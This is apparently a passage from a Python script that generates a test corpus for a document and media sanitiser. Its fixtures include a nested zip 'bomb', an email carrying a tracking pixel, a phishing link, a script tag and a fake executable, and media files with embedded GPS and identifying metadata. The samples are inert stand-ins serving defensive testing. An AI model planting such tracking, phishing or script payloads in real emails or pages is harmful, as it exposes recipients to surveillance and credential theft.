    out.append(Fixture("zip_deep_nesting", "nest.zip", d, "bomb", threats=("Member:ArchiveEntryBlocked",)))
    return out


def eml_fixtures():
    from email.message import EmailMessage
    m = EmailMessage()
    m["From"], m["To"], m["Subject"], m["Date"] = "a@example.com", "b@example.org", "Invoice", "Mon, 01 Jan 2024 10:00:00 +0000"
    m["Received"] = "from mail.internal.example ([10.1.2.3]) by mx.example"
    m["X-Mailer"] = "SecretMailer 1.0"
    m["X-Originating-IP"] = "10.1.2.3"
    m.set_content("Plain body: please see invoice.")
    m.add_alternative('<html><body><p>Hello <b>team</b></p><img src="http://tracker.example/open.gif?id=42" width="1" height="1">'
                      '<a href="http://phish.example/login">Pay now</a><script>alert(1)</script><iframe src="http://x.example"></iframe></body></html>', subtype="html")
    m.add_attachment(pdf_fixtures()[0].data, maintype="application", subtype="pdf", filename="invoice.pdf")
    m.add_attachment(b"MZ" + b"\x00" * 64, maintype="application", subtype="octet-stream", filename="setup.exe")
    return [Fixture("eml_tracking_script_attachments", "mail.eml", m.as_bytes(), "email",
                    threats=("TrackingPixel", "ActiveContent", "ExternalLink", "Attachment:JavaScript", "AttachmentBlocked", "Metadata"),
                    must_not_contain=(b"tracker.example", b"phish.example", b"<script", b"10.1.2.3", b"SecretMailer", b"evil.example", b"MZ"))]


# ============================================================ media
def media_fixtures():
    if not (shutil.which("ffmpeg") and shutil.which("ffprobe")):
        return []
    out = []
    with tempfile.TemporaryDirectory() as d:
        def run(args, name):
            p = os.path.join(d, name)
            subprocess.run(["ffmpeg", "-v", "error", "-y", *args, p], check=True, capture_output=True)
            with open(p, "rb") as f:
                return f.read()
        mp4 = run(["-f", "lavfi", "-i", "testsrc=size=64x64:rate=5:duration=1", "-c:v", "mpeg4", "-metadata", "title=SECRET-TITLE",
                   "-metadata", "location=+19.0760+072.8777/", "-metadata", "artist=CEO-ARTIST", "-movflags", "use_metadata_tags"], "a.mp4")
        out.append(Fixture("mp4_gps_metadata", "clip.mp4", mp4, "media", threats=("GPS",), must_not_contain=(b"SECRET-TITLE", b"CEO-ARTIST", b"19.0760")))
        mp3 = run(["-f", "lavfi", "-i", "sine=frequency=440:duration=1", "-c:a", "libmp3lame", "-metadata", "artist=CEO-ARTIST", "-metadata", "comment=SECRET-COMMENT"], "a.mp3")
        out.append(Fixture("mp3_id3_tags", "song.mp3", mp3, "media", threats=("Metadata",), must_not_contain=(b"CEO-ARTIST", b"SECRET-COMMENT")))
        wav = run(["-f", "lavfi", "-i", "sine=frequency=440:duration=1", "-c:a", "pcm_s16le", "-metadata", "artist=CEO-ARTIST", "-metadata", "comment=SECRET-COMMENT"], "a.wav")
        out.append(Fixture("wav_list_tags", "tone.wav", wav, "media", threats=("Metadata",), must_not_contain=(b"CEO-ARTIST", b"SECRET-COMMENT")))
    return out


def build_all(include_media=True):
    fx = []
    for f in (pdf_fixtures, docx_fixtures, xlsx_fixtures, pptx_fixtures, image_fixtures, svg_fixtures,
              misc_fixtures, archive_fixtures, eml_fixtures):
        fx += f()
    if include_media:
        fx += media_fixtures()
    return fx


if __name__ == "__main__":
    dest = sys.argv[1] if len(sys.argv) > 1 else "test-corpus"
    for f in build_all():
        d = os.path.join(dest, "clean" if f.category == "clean" else "malicious", f.category)
        os.makedirs(d, exist_ok=True)
        with open(os.path.join(d, f.filename if "." in f.filename else f.name), "wb") as fh:
            fh.write(f.data)
    print("wrote corpus to", dest)
